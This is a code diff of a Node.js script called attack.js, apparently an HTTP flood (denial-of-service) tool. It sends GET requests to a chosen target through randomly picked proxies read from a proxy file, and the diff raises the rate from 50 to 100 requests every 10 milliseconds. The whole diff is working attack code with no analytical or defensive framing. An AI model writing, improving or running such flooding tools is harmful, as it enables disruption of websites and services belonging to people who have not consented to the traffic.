@@ -3,19 +3,24 @@ const http = require('http');
 const url = require('url');
 
 if (process.argv.length < 4) {
-    console.log("Usage: node attack.js <target> <time>");
-    process.exit(1);
+    console.log('Usage: node attack.js <http target> <time>');
+    process.exit();
 }
 
 const target = process.argv[2];
-const duration = parseInt(process.argv[3]) * 1000;
-const proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);
+const time = parseInt(process.argv[3]) * 1000;
 
+if (!target.startsWith('http://')) {
+    console.log('Only HTTP supported in this raw version. Use an HTTP site.');
+    process.exit();
+}
+
+const proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(p => p.trim().length > 0);
+const parsed = url.parse(target);
 let sent = 0;
-const endTime = Date.now() + duration;
+const endTime = Date.now() + time;
 
-function flood() {
-    const { hostname, path } = url.parse(target);
+function attack() {
     const proxy = proxies[Math.floor(Math.random() * proxies.length)];
     const [proxyHost, proxyPort] = proxy.split(':');
 
@@ -23,33 +28,34 @@ function flood() {
         host: proxyHost,
         port: parseInt(proxyPort),
         method: 'GET',
-        path: target, // full URL because it's via proxy
+        path: target,
         headers: {
-            Host: hostname,
-            'User-Agent': 'Mozilla/5.0 (compatible; Bot/1.0)',
-            Connection: 'close'
+            Host: parsed.hostname,
+            'User-Agent': 'Mozilla/5.0 (compatible; FloodBot/1.0)',
+            Connection: 'close',
         }
     };
 
     const req = http.request(options);
-    req.on('error', () => {}); // don't log failed
+    req.on('error', () => {}); // ignore failed proxy
     req.end();
 
     sent++;
     console.log(`(${sent}) Sent to ${target}`);
 }
 
-function startFlood() {
+function start() {
     const interval = setInterval(() => {
-        if (Date.now() >= endTime) {
+        if (Date.now() > endTime) {
             clearInterval(interval);
-            console.log(`Finished flooding ${target} | Total Sent: ${sent}`);
-        } else {
-            for (let i = 0; i < 50; i++) {
-                flood();
-            }
+            console.log(`Finished. Total sent: ${sent}`);
+            process.exit();
+        }
+
+        for (let i = 0; i < 100; i++) {
+            attack();
         }
     }, 10);
 }
 
-startFlood();
+start();
